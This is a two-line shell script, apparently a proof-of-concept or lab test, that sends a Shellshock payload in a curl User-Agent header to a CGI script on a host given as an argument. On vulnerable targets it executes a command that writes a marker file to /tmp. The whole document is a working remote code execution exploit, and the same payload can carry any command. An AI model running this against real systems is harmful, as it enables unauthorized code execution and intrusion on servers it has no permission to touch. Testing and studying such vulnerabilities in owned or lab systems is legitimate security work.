DEST=$1

curl -k -H 'User-Agent: () { :;}; echo VULNERABLE>/tmp/shellshock'  http://$DEST/cgi-bin/shockme.cgi